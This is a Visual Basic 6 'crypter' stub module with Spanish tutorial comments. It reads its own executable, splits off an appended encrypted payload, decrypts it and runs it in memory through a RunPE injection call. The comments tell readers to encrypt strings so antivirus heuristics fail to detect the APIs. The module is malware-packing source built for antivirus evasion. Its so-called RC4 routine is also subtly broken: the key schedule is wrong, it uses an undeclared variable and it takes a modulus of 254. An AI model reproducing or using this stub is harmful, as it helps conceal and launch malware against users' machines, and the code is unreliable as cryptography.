Attribute VB_Name = "StubX"
'PD: Quite el Formulario Principal para que el Stub pese menos pero ustedes pueden Dejarlo y hacerlo con el Form!
'Lo primero que haremos sera autoabrirnos Binariamente y leer los datos que se nos han puesto!


Sub Main()
Dim YO As String, Datos As String, sData() As String

YO = App.Path & "\" & App.EXEName & ".exe" 'Aqui solo declaramos esta String para no tener que estar poniendo eso tan largo cada vez que lo usemos!

Open YO For Binary As #1 'Nos Autoabrimos!
Datos = Space(LOF(1)) 'Obtenemos Los datos de El Stub
Get #1, , Datos
Close #1 'Nos cerramos xD!

'Ahora ya hemos obtenido los datos del Stub Pero Lo que obtenemos en verdad es

' Stub & Archivo encriptado por lo que usaremos el Delimitador que antes pusimos para separar esos datos y poder Utilizarlos!

sData() = Split(Datos, "##$$##") 'Aki lo que hacemos es delimitar los Archivos es decir

'sData(0) = Stub      sData(1) = Archivo Encriptado !
'Por lo que ahora agregamos el RunPe que se utiliza para Ejecutar un Archivo cualquiera directamente en Memoria que eso es lo que hace que sea RunTime porque no necesita
'extraerese en ningun directorio sino que va directo a la memoria! ;)
'COmo veran ahi esta el RunPE sin Encriptar por lo que ustedes tendran que hacerse para encriptar todos los Strings que estan entre las "" menos las APIS por suspuesto para evitar que ls Antiirus Detecten las APIS por Heuristica!
'Bueno Ahora lo que haremos es desencriptar los archivos para despues ejecutarnos en Memoria!
'sData(2) = Contraseña definida por el usuario!

sData(1) = RC4(sData(1), sData(2)) 'Aki cogemos los datos encriptados y los desencriptamos!

Injec YO, StrConv(sData(1), vbFromUnicode), vbNullString 'Nos ejecutamos en memoria convirtiendo esos datos desde Unicode!

'Pues ya esta encriptado todo y hecho el Stub Ahora solo lo Guardamos y Compilamos haber que pasa!
'Para que el Stub pese menos podemos compilarlo en P-Code lo que hace que el Stub Libere una buena parte de Tamaño y se minimize a 16 o 12 kb
 
End Sub


Public Function RC4(ByVal Data As String, ByVal Password As String) As String
On Error Resume Next
Dim F(0 To 255) As Integer, X, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For X = 0 To 255
    Y = (Y + F(X) + Key(X Mod Len(Password))) Mod 256
    F(X) = X
Next X
Key() = StrConv(Data, vbFromUnicode)
For X = 0 To Len(Data)
    Y = (Y + F(Y) + 1) Mod 256
    Key(X) = Key(X) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next X
RC4 = StrConv(Key, vbUnicode)
End Function

